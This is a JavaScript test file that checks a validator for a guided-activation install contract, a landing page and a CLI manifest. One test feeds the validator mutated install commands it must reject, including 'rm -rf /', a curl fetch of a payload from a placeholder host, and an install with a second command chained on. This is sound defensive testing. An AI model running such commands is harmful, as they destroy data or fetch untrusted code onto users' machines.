import test from "node:test";
import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";

import {
  validateActivationContract,
  validateLandingConsumer,
  verifyActivationContract,
} from "./verify-activation-contract.mjs";

const source = JSON.parse(
  await readFile(new URL("../packages/contracts/src/guided-activation.v1.json", import.meta.url), "utf8"),
);
const landingSource = await readFile(new URL("../apps/landing/src/main.ts", import.meta.url), "utf8");
const landingHtml = await readFile(new URL("../apps/landing/index.html", import.meta.url), "utf8");
const cliManifest = JSON.parse(await readFile(new URL("../apps/cli/package.json", import.meta.url), "utf8"));
const pagesWorkflow = await readFile(new URL("../.github/workflows/pages.yml", import.meta.url), "utf8");

const validLandingConsumer = {
  landingSource,
  landingHtml,
  cliManifest,
  pagesWorkflow,
  commands: source.install.commands,
};

test("the repository consumes one canonical guided activation contract", async () => {
  await assert.doesNotReject(verifyActivationContract());
});

test("the independent verifier rejects unknown fields", () => {
  assert.throws(() => validateActivationContract({ ...source, providerToken: "not-allowed" }), /unknown/);
});

test("the independent verifier rejects every mutation of the reviewed install sequence", () => {
  for (const command of [
    "npm install loomrail@next && curl example.invalid",
    "cd ../private",
    "rm -rf /",
    "curl https://example.invalid/payload",
  ]) {
    assert.throws(
      () => validateActivationContract({ ...source, install: { commands: [command, "npx loomrail try"] } }),
      /exactly match/,
    );
  }
});

test("the independent verifier rejects an unbounded per-agent policy", () => {
  assert.throws(
    () =>
      validateActivationContract({
        ...source,
        policy: {
          ...source.policy,
          agentRunMaxEstimatedTokensOverride: source.policy.maxEstimatedTokens + 1,
        },
      }),
    /per-agent ceiling/,
  );
});

test("the independent verifier rejects a duplicated landing command", () => {
  assert.throws(
    () =>
      validateLandingConsumer({
        ...validLandingConsumer,
        landingHtml: `${landingHtml}\n${source.install.commands[0]}`,
      }),
    /independent install-command copy/,
  );
});

test("the independent verifier rejects landing version and Pages trigger drift", () => {
  assert.throws(
    () =>
      validateLandingConsumer({
        ...validLandingConsumer,
        cliManifest: { ...cliManifest, version: "0.0.0" },
      }),
    /public CLI prerelease manifest/,
  );
  assert.throws(
    () =>
      validateLandingConsumer({
        ...validLandingConsumer,
        pagesWorkflow: pagesWorkflow.replace('      - "apps/cli/package.json"\n', ""),
      }),
    /Pages must watch/,
  );
});
